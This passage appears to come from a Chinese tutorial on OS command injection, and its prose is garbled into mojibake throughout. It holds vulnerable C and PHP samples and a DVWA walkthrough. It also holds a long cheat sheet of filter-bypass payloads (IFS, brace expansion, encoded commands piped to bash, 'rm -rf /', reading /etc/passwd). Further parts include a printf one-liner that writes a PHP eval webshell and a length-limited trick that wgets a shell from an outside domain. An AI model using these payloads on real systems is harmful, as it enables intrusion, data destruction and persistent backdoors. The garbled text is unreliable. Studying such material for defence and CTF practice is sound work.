å·¥å…·ï¼Œå…è®¸ç³»ç»Ÿç®¡ç†å‘˜åœ¨åŸ¹è®­ä¸­æ£€æŸ¥ç‰¹æƒç³»ç»Ÿæ–‡ä»¶ï¼Œè€Œä¸ä¼šè®©ä»–ä»¬ä¿®æ”¹å®ƒä»¬æˆ–æŸåç³»ç»Ÿã€‚\nint main(char* argc, char** argv) { char cmd[CMD_MAX] = \u0026#34;/usr/bin/cat \u0026#34;; strcat(cmd, argv[1]); system(cmd); } ç”±äºç¨‹åºä»¥rootæƒé™è¿è¡Œï¼Œå› æ­¤å¯¹system()çš„è°ƒç”¨ä¹Ÿä»¥rootæƒé™æ‰§è¡Œã€‚ å¦‚æœç”¨æˆ·æŒ‡å®šæ ‡å‡†æ–‡ä»¶åï¼Œåˆ™ç¨‹åºè°ƒç”¨ä¼šæŒ‰é¢„æœŸå·¥ä½œã€‚ ä½†æ˜¯ï¼Œå¦‚æœæ”»å‡»è€…ä¼ é€’1; rm -rf /å½¢å¼çš„å­—ç¬¦ä¸²ï¼Œæ— è®ºå½“å‰ç›®å½•æ˜¯å¦æœ‰1è¿™ä¸ªæ–‡ä»¶ï¼Œéƒ½ä¼šç»§ç»­å‘ä¸‹æ‰§è¡Œrm -rf /ã€‚\nExample 3 æœ¬ä¾‹ä¸­ï¼Œæœ¬ç¨‹åºæ‹¥æœ‰å¯¹åº”çš„æƒé™ï¼Œä½¿ç”¨ç¯å¢ƒå˜é‡$APPHOMEæ¥ç¡®å®šåº”ç”¨ç¨‹åºçš„å®‰è£…ç›®å½•ï¼Œç„¶ååœ¨è¯¥ç›®å½•ä¸­æ‰§è¡Œåˆå§‹åŒ–è„šæœ¬\nchar* home=getenv(\u0026#34;APPHOME\u0026#34;); char* cmd=(char*)malloc(strlen(home)+strlen(INITCMD)); if (cmd) { strcpy(cmd,home); strcat(cmd,INITCMD); execl(cmd, NULL); } æœ¬ä¾‹å‰æä¸Example 2ä¸­ä¸€æ ·ï¼Œæ­¤ç¤ºä¾‹ä¸­çš„ä»£ç å…è®¸æ”»å‡»è€…ä½¿ç”¨åº”ç”¨ç¨‹åºçš„æå‡æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥ä¿®æ”¹ç¯å¢ƒå˜é‡$APPHOMEé€šè¿‡åˆ¶å®šä¸åŒçš„è·¯å¾„ä»¥ä½¿ç”¨å«æœ‰æ¶æ„ä»£ç çš„INITCMDã€‚ ç”±äºç¨‹åºä¸éªŒè¯ä»getenv()è¯»å–çš„å€¼ï¼Œå› æ­¤é€šè¿‡æ§åˆ¶ç¯å¢ƒå˜é‡ï¼Œæ”»å‡»è€…å¯ä»¥æ¬ºéª—åº”ç”¨ç¨‹åºè¿è¡Œæ¶æ„ä»£ç ã€‚\næ”»å‡»è€…ä½¿ç”¨ç¯å¢ƒå˜é‡æ¥æ§åˆ¶ç¨‹åºè°ƒç”¨çš„å‘½ä»¤ï¼Œå› æ­¤åœ¨æ­¤ç¤ºä¾‹ä¸­ç¯å¢ƒå˜é‡çš„å½±å“æ˜¯éå¸¸å·¨å¤§çš„ã€‚\nExample 4 ä¸‹é¢çš„ä»£ç æ¥è‡ªåŸºäºWebçš„CGIå®ç”¨ç¨‹åºï¼Œå…è®¸ç”¨æˆ·æ›´æ”¹å…¶å¯†ç ã€‚ NISä¸‹çš„å¯†ç æ›´æ–°è¿‡ç¨‹åŒ…æ‹¬åœ¨/var/ypç›®å½•ä¸­è¿è¡Œmakeã€‚ è¯·æ³¨æ„ï¼Œç”±äºç¨‹åºæ›´æ–°å¯†ç è®°å½•ï¼Œå› æ­¤å·²å®‰è£…setuid rootã€‚å‡½æ•°å¯¹makeè°ƒç”¨å¦‚ä¸‹ï¼š\nsystem(\u0026#34;cd /var/yp \u0026amp;\u0026amp; make \u0026amp;\u0026gt; /dev/null\u0026#34;); ä¸å‰é¢çš„ç¤ºä¾‹ä¸åŒï¼Œæ­¤ç¤ºä¾‹ä¸­çš„å‘½ä»¤æ˜¯æ²¡æœ‰å¯æ§è¾“å…¥çš„ç¡¬ç¼–ç ï¼Œå› æ­¤æ”»å‡»è€…æ— æ³•æ§åˆ¶ä¼ é€’ç»™system()çš„å‚æ•°ã€‚ä½†æ˜¯ï¼Œç”±äºç¨‹åºæ²¡æœ‰ä¸ºmakeæŒ‡å®šç»å¯¹è·¯å¾„ï¼Œå¹¶ä¸”åœ¨è°ƒç”¨å‘½ä»¤ä¹‹å‰æ²¡æœ‰æ“¦é™¤ä»»ä½•ç¯å¢ƒå˜é‡ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥ä¿®æ”¹å…¶$PATHå˜é‡ä»¥æŒ‡å‘åä¸ºmakeçš„æ¶æ„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶ä»ä¸­æ‰§è¡ŒCGIè„šæœ¬ã€‚shellæç¤ºã€‚ç”±äºè¯¥ç¨‹åºå·²ç»å®‰è£…äº†setuid rootï¼Œå› æ­¤æ”»å‡»è€…çš„makeç‰ˆæœ¬ç°åœ¨ä»¥rootæƒé™è¿è¡Œã€‚\nç¯å¢ƒåœ¨ç¨‹åºä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ–¹é¢å‘æŒ¥ç€é‡è¦ä½œç”¨ã€‚system()å’Œexec()ä¹‹ç±»çš„å‡½æ•°ä½¿ç”¨è°ƒç”¨å®ƒä»¬çš„ç¨‹åºç¯å¢ƒï¼Œå› æ­¤æ”»å‡»è€…æœ‰å¯èƒ½å½±å“è¿™äº›è°ƒç”¨çš„è¡Œä¸ºã€‚\næœ‰å¾ˆå¤šæ–‡ç« ä¼šæåˆ°Javaçš„Runtime.execä¸Cçš„ç³»ç»ŸåŠŸèƒ½å®Œå…¨ç›¸åŒã€‚å…¶å®ä¸ç„¶ã€‚è™½ç„¶ä¸¤è€…éƒ½å…è®¸è°ƒç”¨æ–°çš„ç¨‹åº/è¿›ç¨‹ï¼Œä½†æ˜¯ï¼ŒCçš„ç³»ç»Ÿå‡½æ•°å°†å…¶å‚æ•°ä¼ é€’ç»™è¦è§£æçš„shell(/bin/sh)ï¼Œè€ŒRuntime.execå°è¯•å°†å­—ç¬¦ä¸²æ‹†åˆ†ä¸ºå•è¯æ•°ç»„ï¼Œç„¶åä½¿ç”¨å…¶ä½™å•è¯æ‰§è¡Œæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå•è¯ä½œä¸ºå‚æ•°ã€‚Runtime.execä¸ä¼šå°è¯•åœ¨ä»»ä½•æ—¶å€™è°ƒç”¨shellã€‚å…³é”®çš„åŒºåˆ«åœ¨äºshellæä¾›çš„å¤§éƒ¨åˆ†åŠŸèƒ½å¯è¢«æ¶æ„åˆ©ç”¨çš„ç‚¹ï¼ˆä¾‹å¦‚ï¼†ï¼Œ\u0026amp;\u0026amp;ï¼Œ|ï¼Œ||ç­‰é“¾æ¥å‘½ä»¤ï¼Œé‡å®šå‘è¾“å…¥å’Œè¾“å‡ºï¼‰å°†ç®€å•åœ°ç»“æŸä½œä¸ºä¼ é€’ç»™ç¬¬ä¸€ä¸ªå‘½ä»¤çš„å‚æ•°ï¼Œå¯èƒ½å¯¼è‡´è¯­æ³•é”™è¯¯ï¼Œæˆ–è¢«æŠ›å‡ºä½œä¸ºæ— æ•ˆå‚æ•°ã€‚\nExample 5 ä»¥ä¸‹ç®€å•çš„ä»£ç ç‰‡æ®µæ˜“å—Unix/Linuxå¹³å°ä¸Šçš„OSå‘½ä»¤æ³¨å…¥æ”»å‡»ï¼š\n#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; int main(int argc, char **argv) { char command[256]; if(argc != 2) { printf(\u0026#34;Error: Please enter a program to time!\\n\u0026#34;); return -1; } memset(\u0026amp;command, 0, sizeof(command)); strcat(command, \u0026#34;time ./\u0026#34;); strcat(command, argv[1]); system(command); return 0; } å¦‚æœè¿™æ˜¯ä¸€ä¸ªsuidäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¯·è€ƒè™‘æ”»å‡»è€…è¾“å…¥ä»¥ä¸‹å†…å®¹çš„æƒ…å†µ:ls; cat /etc/passwdã€‚ åœ¨Unixç¯å¢ƒä¸­ï¼Œshellå‘½ä»¤ç”¨åˆ†å·åˆ†éš”ã€‚ æˆ‘ä»¬ç°åœ¨å¯ä»¥éšæ„æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼\nExample 6 \u0026lt;?php print(\u0026#34;Please specify the name of the file to delete\u0026#34;); print(\u0026#34;\u0026lt;p\u0026gt;\u0026#34;); $file=$_GET[\u0026#39;filename\u0026#39;]; system(\u0026#34;rm $file\u0026#34;); ?\u0026gt;ä»¥ä¸‹æˆåŠŸæ”»å‡»çš„ç¤ºä¾‹ï¼š\nRequest:\nhttp://127.0.0.1/delete.php?filename=bob.txt;id Response:\nPlease specify the name of the file to delete uid=33(www-data) gid=33(www-data) groups=33(www-data) å†ä¸¾ä¸ªä¾‹å­ ?çš„ä½¿ç”¨ $ cat /fl?? NUAACTF{56723419231} $ cat /???/??ss daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin _apt:x:102:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:103:107:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin [\u0026hellip;]çš„ä½¿ç”¨ [...]åŒ¹é…æ–¹æ‹¬å·ä¹‹ä¸­çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ï¼Œæ¯”å¦‚[aeiou]å¯ä»¥åŒ¹é…äº”ä¸ªå…ƒéŸ³å­—æ¯ã€‚\n# å­˜åœ¨æ–‡ä»¶ a.txt å’Œ b.txt å’Œ c.txt å’Œ ab.txt $ ls [ab].txt a.txt b.txt $ ls *[ab].txt ab.txt a.txt b.txt $ ls [a-c].txt a.txt b.txt c.txt $ ls *[a-c].txt a.txt ab.txt abc.txt b.txt c.txt {\u0026hellip;}çš„ä½¿ç”¨ {...} è¡¨ç¤ºåŒ¹é…å¤§æ‹¬å·é‡Œé¢çš„æ‰€æœ‰æ¨¡å¼ï¼Œæ¨¡å¼ä¹‹é—´ä½¿ç”¨é€—å·åˆ†éš”ã€‚\n$ echo d{a,e,i,u,o}g dag deg dig dug dog #\tå¤§æ‹¬å·å¯ä»¥åµŒå¥—ä½¿ç”¨ $ echo {j{p,pe}g,png} jpg jpeg png #\t{start..end}åŒ¹é…è¿ç»­å­—ç¬¦ $ cat /f{0..z}ag NUAACTF{56723419231} {...}ä¸[...]æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„åŒºåˆ«ã€‚å¦‚æœåŒ¹é…çš„æ–‡ä»¶ä¸å­˜åœ¨ï¼Œ[...]ä¼šå¤±å»æ¨¡å¼çš„åŠŸèƒ½ï¼Œå˜æˆä¸€ä¸ªå•çº¯çš„å­—ç¬¦ä¸²ï¼Œè€Œ{...}ä¾ç„¶å¯ä»¥å±•å¼€ã€‚\n# ä¸å­˜åœ¨ a.txt å’Œ b.txt $ ls [ab].txt ls: [ab].txt: No such file or directory $ ls {a,b}.txt ls: a.txt: No such file or directory ls: b.txt: No such file or directory Tips åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­åº”è¯¥æ³¨æ„ï¼š\n  é€šé…ç¬¦æ˜¯å…ˆè§£é‡Šï¼Œå†æ‰§è¡Œã€‚\nBash æ¥æ”¶åˆ°å‘½ä»¤ä»¥åï¼Œå‘ç°é‡Œé¢æœ‰é€šé…ç¬¦ï¼Œä¼šè¿›è¡Œé€šé…ç¬¦æ‰©å±•ï¼Œç„¶åå†æ‰§è¡Œå‘½ä»¤ã€‚\n$ ls a*.txt ab.txt #\tä¸Šé¢å‘½ä»¤çš„æ‰§è¡Œè¿‡ç¨‹æ˜¯ï¼ŒBash å…ˆå°†a*.txtæ‰©å±•æˆab.txtï¼Œç„¶åå†æ‰§è¡Œls ab.txtã€‚   é€šé…ç¬¦ä¸åŒ¹é…ï¼Œä¼šåŸæ ·è¾“å‡ºã€‚\nBash æ‰©å±•é€šé…ç¬¦çš„æ—¶å€™ï¼Œå‘ç°ä¸å­˜åœ¨åŒ¹é…çš„æ–‡ä»¶ï¼Œä¼šå°†é€šé…ç¬¦åŸæ ·è¾“å‡ºã€‚\n$ ls *.csv ls: *.csv: No such file or directory #\tå¦å¤–ï¼Œå‰é¢å·²ç»è¯´è¿‡ï¼Œè¿™æ¡è§„åˆ™å¯¹{...}ä¸é€‚ç”¨   åªé€‚ç”¨äºå•å±‚è·¯å¾„ã€‚\nä¸Šé¢æ‰€æœ‰é€šé…ç¬¦åªåŒ¹é…å•å±‚è·¯å¾„ï¼Œä¸èƒ½è·¨ç›®å½•åŒ¹é…ï¼Œå³æ— æ³•åŒ¹é…å­ç›®å½•é‡Œé¢çš„æ–‡ä»¶ã€‚æˆ–è€…è¯´ï¼Œ?æˆ–*è¿™æ ·çš„é€šé…ç¬¦ï¼Œä¸èƒ½åŒ¹é…è·¯å¾„åˆ†éš”ç¬¦ï¼ˆ/ï¼‰ã€‚\nå¦‚æœè¦åŒ¹é…å­ç›®å½•é‡Œé¢çš„æ–‡ä»¶ï¼Œå¯ä»¥å†™æˆä¸‹é¢è¿™æ ·ã€‚\n$ ls */*.txt   å¯ç”¨äºæ–‡ä»¶åã€‚\nBash å…è®¸æ–‡ä»¶åä½¿ç”¨é€šé…ç¬¦ã€‚è¿™æ—¶ï¼Œå¼•ç”¨æ–‡ä»¶åçš„æ—¶å€™ï¼Œéœ€è¦æŠŠæ–‡ä»¶åæ”¾åœ¨å•å¼•å·é‡Œé¢ã€‚\n$ touch \u0026#39;fo*\u0026#39; $ ls fo* #\tä¸Šé¢ä»£ç åˆ›å»ºäº†ä¸€ä¸ªfo*æ–‡ä»¶ï¼Œè¿™æ—¶*å°±æ˜¯æ–‡ä»¶åçš„ä¸€éƒ¨åˆ†ã€‚   è¿ç”¨ ä»¥DVWAä¸ºä¾‹\nCommand Injection: low \u0026lt;?php if( isset( $_POST[ \u0026#39;Submit\u0026#39; ] ) ) { // Get input  $target = $_REQUEST[ \u0026#39;ip\u0026#39; ]; // Determine OS and execute the ping command.  if( stristr( php_uname( \u0026#39;s\u0026#39; ), \u0026#39;Windows NT\u0026#39; ) ) { // Windows  $cmd = shell_exec( \u0026#39;ping \u0026#39; . $target ); } else { // *nix  $cmd = shell_exec( \u0026#39;ping -c 4 \u0026#39; . $target ); } // Feedback for the end user  echo \u0026#34;\u0026lt;pre\u0026gt;{$cmd}\u0026lt;/pre\u0026gt;\u0026#34;; } ?\u0026gt;è¿™é‡Œæ²¡æœ‰å¯¹ipè¿›è¡Œè¾“å…¥æ£€æµ‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨;cmdçš„æ–¹å¼è¿›è¡Œå‘½ä»¤æ³¨å…¥ã€‚\n \n####Command Injection: medium\n\u0026lt;?php if( isset( $_POST[ \u0026#39;Submit\u0026#39; ] ) ) { // Get input  $target = $_REQUEST[ \u0026#39;ip\u0026#39; ]; // Set blacklist  $substitutions = array( \u0026#39;\u0026amp;\u0026amp;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ); // Remove any of the charactars in the array (blacklist).  $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command.  if( stristr( php_uname( \u0026#39;s\u0026#39; ), \u0026#39;Windows NT\u0026#39; ) ) { // Windows  $cmd = shell_exec( \u0026#39;ping \u0026#39; . $target ); } else { // *nix  $cmd = shell_exec( \u0026#39;ping -c 4 \u0026#39; . $target ); } // Feedback for the end user  echo \u0026#34;\u0026lt;pre\u0026gt;{$cmd}\u0026lt;/pre\u0026gt;\u0026#34;; } ?\u0026gt;è¿™é‡Œä»…ä»…åªæ˜¯å¢åŠ äº†\u0026amp;\u0026amp;ä¸;ä¸¤ä¸ªçš„è¿‡æ»¤ã€‚ç„¶è€Œæˆ‘ä»¬ä»ç„¶å¯ä»¥ä½¿ç”¨|æ¥è¿›è¡Œç»•è¿‡ã€‚\n \n####Command Injection: high\n\u0026lt;?php if( isset( $_POST[ \u0026#39;Submit\u0026#39; ] ) ) { // Get input  $target = trim($_REQUEST[ \u0026#39;ip\u0026#39; ]); // Set blacklist  $substitutions = array( \u0026#39;\u0026amp;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;| \u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;-\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;$\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;(\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;)\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;`\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;||\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ); // Remove any of the charactars in the array (blacklist).  $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command.  if( stristr( php_uname( \u0026#39;s\u0026#39; ), \u0026#39;Windows NT\u0026#39; ) ) { // Windows  $cmd = shell_exec( \u0026#39;ping \u0026#39; . $target ); } else { // *nix  $cmd = shell_exec( \u0026#39;ping -c 4 \u0026#39; . $target ); } // Feedback for the end user  echo \u0026#34;\u0026lt;pre\u0026gt;{$cmd}\u0026lt;/pre\u0026gt;\u0026#34;; } ?\u0026gt;è¿™é‡Œä»”ç»†è§‚å¯Ÿï¼Œå…¶å®|ç®¡é“ç¬¦è¿™é‡Œæœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œæ‰€ä»¥æˆ‘ä»¬mediumçš„payloadè¿˜å¯ä»¥ç»§ç»­ä½¿ç”¨ï¼Œä½†æ˜¯å¦‚æœçœŸçš„è¿‡æ»¤äº†|æ€ä¹ˆåŠå‘¢ã€‚æˆ‘ä»¬å…¶å®è¿˜å¯ä»¥æŠ“åŒ…åŠ å…¥%0aæ¢è¡Œç¬¦è¿›è¡Œä¸€ä¸ªç»•è¿‡ã€‚ä½¿ç”¨127.0.0.1 %0acat /etc/passwdè¿›è¡Œç»•è¿‡\n \nCommand Injection: impossible \u0026lt;?php if( isset( $_POST[ \u0026#39;Submit\u0026#39; ] ) ) { // Check Anti-CSRF token  checkToken( $_REQUEST[ \u0026#39;user_token\u0026#39; ], $_SESSION[ \u0026#39;session_token\u0026#39; ], \u0026#39;index.php\u0026#39; ); // Get input  $target = $_REQUEST[ \u0026#39;ip\u0026#39; ]; $target = stripslashes( $target ); // Split the IP into 4 octects  $octet = explode( \u0026#34;.\u0026#34;, $target ); // Check IF each octet is an integer  if( ( is_numeric( $octet[0] ) ) \u0026amp;\u0026amp; ( is_numeric( $octet[1] ) ) \u0026amp;\u0026amp; ( is_numeric( $octet[2] ) ) \u0026amp;\u0026amp; ( is_numeric( $octet[3] ) ) \u0026amp;\u0026amp; ( sizeof( $octet ) == 4 ) ) { // If all 4 octets are int\u0026#39;s put the IP back together.  $target = $octet[0] . \u0026#39;.\u0026#39; . $octet[1] . \u0026#39;.\u0026#39; . $octet[2] . \u0026#39;.\u0026#39; . $octet[3]; // Determine OS and execute the ping command.  if( stristr( php_uname( \u0026#39;s\u0026#39; ), \u0026#39;Windows NT\u0026#39; ) ) { // Windows  $cmd = shell_exec( \u0026#39;ping \u0026#39; . $target ); } else { // *nix  $cmd = shell_exec( \u0026#39;ping -c 4 \u0026#39; . $target ); } // Feedback for the end user  echo \u0026#34;\u0026lt;pre\u0026gt;{$cmd}\u0026lt;/pre\u0026gt;\u0026#34;; } else { // Ops. Let the user name theres a mistake  echo \u0026#39;\u0026lt;pre\u0026gt;ERROR: You have entered an invalid IP.\u0026lt;/pre\u0026gt;\u0026#39;; } } // Generate Anti-CSRF token generateSessionToken(); ?\u0026gt;è¿™é‡Œå¯¹ipä»¥.åˆ†ç»„å¹¶æ£€æŸ¥äº†æ˜¯å¦ä¸ºæ•°å­—ï¼Œå¢åŠ äº†æ›´å¤šçš„è¿‡æ»¤ï¼Œæ‰€ä»¥æ²¡åŠæ³•ä½¿ç”¨ä¹‹å‰é‚£äº›trickæ¥è¿›è¡Œç»•è¿‡äº†ã€‚\nå¸¸ç”¨ç»•è¿‡ å‘½ä»¤åˆ†éš”ä¸æ‰§è¡Œå¤šæ¡å‘½ä»¤ åœ¨Unixä¸Š:\n%0a %0d ; \u0026amp; | $(shell_command) `shell_command` {shell_command,} åœ¨Windowsä¸Šï¼š\n%0a \u0026amp; | %1a - ä¸€ä¸ªç¥å¥‡çš„è§’è‰²ï¼Œä½œä¸º.batæ–‡ä»¶ä¸­çš„å‘½ä»¤åˆ†éš”ç¬¦ ä¾‹å¦‚ï¼š\n\u0026lt;?php $command = \u0026#39;dir \u0026#39;.$_POST[\u0026#39;dir\u0026#39;]; $escaped_command = escapeshellcmd($command); var_dump($escaped_command); file_put_contents(\u0026#39;out.bat\u0026#39;,$escaped_command); system(\u0026#39;out.bat\u0026#39;); ?\u0026gt;å¯ä»¥åˆ©ç”¨%1aç»•è¿‡\ndir=../ %1a whoami æ¯”è¾ƒè€çš„phpç‰ˆæœ¬ï¼Œå¦‚5.2.5åŠä¹‹å‰å¯ä»¥é€šè¿‡è¾“å…¥å¤šå­—èŠ‚æ¥ç»•è¿‡ã€‚ç°åœ¨å‡ ä¹è§ä¸åˆ°äº†ã€‚\nescapeshellcmd(\u0026#34;echo \u0026#34;.chr(0xc0).\u0026#34;;id\u0026#34;); //echo ç¹º;id ç©ºæ ¼ç»•è¿‡   ä½¿ç”¨\u0026lt;æˆ–è€…\u0026lt;\u0026gt;\n$ cat\u0026lt;/flag flag{xxx} $ cat\u0026lt;\u0026gt;/flag flag{xxx}   ä½¿ç”¨IFSæˆ–è€…\n$ cat$IFS$9/flag flag{xxx} $ cat${IFS}/flag flag{xxx} $ cat$IFS/flag flag{xxx}   åœ¨urlçš„ç¼–ç ç»•è¿‡\nè¿™é‡Œæˆ‘fuzzäº†ä¸€ä¸‹ï¼ŒLinux bashå¯ä»¥ä½¿ç”¨%20(space)ã€%09(tab)ã€%3c(\u0026lt;)ä»¥åŠ+æ¥ç»•è¿‡\n \n  èŠ±æ‹¬å·æ‹“å±•{OS_COMMAND,ARGUMENT}\nåœ¨Linux bashä¸­è¿˜å¯ä»¥ä½¿ç”¨{cat,/etc/passwd}æ¥ç»•è¿‡\n \n  å˜é‡æ§åˆ¶\n$ X=$\u0026#39;cat\\x20/flag\u0026#39;\u0026amp;\u0026amp;$X flag{xxx} $ X=$\u0026#39;cat\\x09/flag\u0026#39;\u0026amp;\u0026amp;$X flag{xxx} #è¿™é‡Œ\\x3cä¸å¯ä»¥   é‡‡ç”¨$@ç»•è¿‡\n$ c$@at /fl$@ag flag{xxx} $ echo i$@d id $ echo i$@d|$0 uid=0(root) gid=0(root) groups=0(root)   é»‘åå•ç»•è¿‡   é‡‡ç”¨å˜é‡\n$ a=l;b=s;$a$b bin boot dev\tetc home lib\tlib64 media mnt opt\tproc root run sbin srv sys tmp usr var $ a=c;b=at;c=flag;$a$b $c flag{xxx}   ç¼–ç ç»•è¿‡\n$ echo \u0026#34;Y2F0IC9mbGFn\u0026#34;|base64 -d|bash flag{xxx} #base64_endcode(\u0026#34;cat /flag\u0026#34;) =\u0026gt; Y2F0IC9mbGFn #base64å¯èƒ½ä¼šå‡ºç°/ $ echo \u0026#34;636174202f666c6167\u0026#34; | xxd -r -p|bash\t#hex flag{xxx} $ $(printf \u0026#34;\\154\\163\u0026#34;)\t#oct bin boot dev\tetc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var $ $(cat /flag) bash: flag{xxx}: æœªæ‰¾åˆ°å‘½ä»¤ $ $(printf \u0026#34;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\u0026#34;) flag{xxx} $ {printf,\u0026#34;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\u0026#34;}|$0 flag{xxx} #å¯ä»¥é€šè¿‡è¿™æ ·æ¥å†™webshell,å†…å®¹ä¸º\u0026lt;?php @eval($_POST[\u0026#39;c\u0026#39;]);?\u0026gt; $ {printf,\u0026#34;\\74\\77\\160\\150\\160\\40\\100\\145\\166\\141\\154\\50\\44\\137\\120\\117\\123\\124\\133\\47\\143\\47\\135\\51\\73\\77\\76\u0026#34;} \u0026gt;\u0026gt; 1.php   å•å¼•å·åŒå¼•å·\n$ c\u0026#34;a\u0026#34;t /f\u0026#39;\u0026#39;l\u0026#39;a\u0026#39;g flag{xxx}   åæ–œçº¿\n$ c\\a\\t /f\\l\\ag flag{xxx}   åˆ©ç”¨å·²ç»å­˜åœ¨çš„èµ„æº\n$ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin $ echo $PATH| cut -c 1 /   åˆ©ç”¨ä¸€äº›å·²æœ‰å­—ç¬¦\n ${PS2} å¯¹åº”å­—ç¬¦ \u0026gt; ${PS4} å¯¹åº”å­—ç¬¦ + ${IFS} å¯¹åº” å†…éƒ¨å­—æ®µåˆ†éš”ç¬¦ ${9} å¯¹åº” ç©ºå­—ç¬¦ä¸²    ä¸¾ä¸ªä¾‹å­ çŸ­å‘½ä»¤æ‰§è¡Œ é¦–å…ˆæŒ‰ç…§å‰é¢çš„\u0026gt;çš„ç”¨æ³•ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“æœ‰æ ‡å‡†è¾“å‡ºå¯ä»¥è¾“å‡ºåˆ°æ–‡ä»¶ï¼Œæ‰€ä»¥\n \nè¿™é‡Œæˆ‘ä»¬æœ‰ä¸¤ç§æ„é€ æ–¹å¼:\n  åªç”¨\\åˆ†è¡Œè¾“å…¥ï¼Œè¿™ä¸ªä¼˜ç‚¹æ˜¯å¯ä»¥ä¸ç”¨è€ƒè™‘æ—¶é—´é¡ºåºï¼Œç›´æ¥ç”¨ls\u0026gt;aè¾“å‡ºåˆ°aæ–‡ä»¶ï¼Œè¿™é‡Œå¯èƒ½æœ‰ä¸€ç‚¹è¯¯è§£ï¼Œè¿™é‡Œæ˜¯è¾“å…¥\n$ \u0026gt;ec\\ ho\\ \\ 1 #è¿™ä¸ªæ–¹æ³•å‰é¢ä¸éœ€è¦åŠ \u0026gt;ï¼Œæœ€åç”¨\\è½¬ä¹‰ç©ºæ ¼    \nä½¿ç”¨\\\\ï¼Œè¿™ç§æ–¹æ³•æ˜¯åˆ©ç”¨\\æ¥æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œå…¶ä¸­å‰ä¸€ä¸ª\\æ˜¯ç”¨æ¥è½¬ä¹‰åä¸€ä¸ª\\çš„ã€‚è¿™é‡Œéœ€è¦è€ƒè™‘æ—¶é—´é¡ºåºï¼Œéœ€è¦é€†åºæ¥åˆ›å»ºæ–‡ä»¶ã€‚   \nExample 1\tä¸ƒå­—ç»•è¿‡ è¿™é‡Œæ˜¯ä¸ªpç‰›å‡ºçš„é¢˜\n\u0026lt;?php if(strlen($_GET[1])\u0026lt;8){ echo shell_exec($_GET[1]); } ?\u0026gt;æˆ‘ä»¬å¯ä»¥åˆ†åˆ«é€šè¿‡å‘é€\n?1=\u0026gt;hp ?1=\u0026gt;ell.p\\\\ ?1=\u0026gt;\\ sh\\\\ ?1=\u0026gt;\\ -O\\\\ ?1=\u0026gt;com\\\\ ?1=\u0026gt;x.\\\\ ?1=\u0026gt;\\ xx\\\\ ?1=\u0026gt;wget\\\\ ?1=ls -t\u0026gt;a ?1=sh a ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸Šè¿°çš„ç¬¬äºŒä¸ªæ–¹æ³•å†™å…¥ä¸€ä¸ªaæ–‡ä»¶ï¼Œå…¶ä¸­xxx.comå¯ä»¥æ›¿æ¢ä¸ºè‡ªå·±çš„åŸŸåï¼Œä½†æ˜¯è¿™é‡Œè¦æ³¨æ„ï¼Œä¸èƒ½ä»¥.å¼€å¤´ï¼Œå› ä¸ºls -t\u0026gt;aæ— æ³•å°†éšè—æ–‡ä»¶åå†™å…¥aã€‚\nè´´ä¸€ä¸‹pç‰›çš„è„šæœ¬\n#!/usr/bin/python3 #-*- coding: utf-8 -*-  import requests def GetShell(): url = \u0026#34;http://192.168.56.129/shell.php?1=\u0026#34; fileNames = 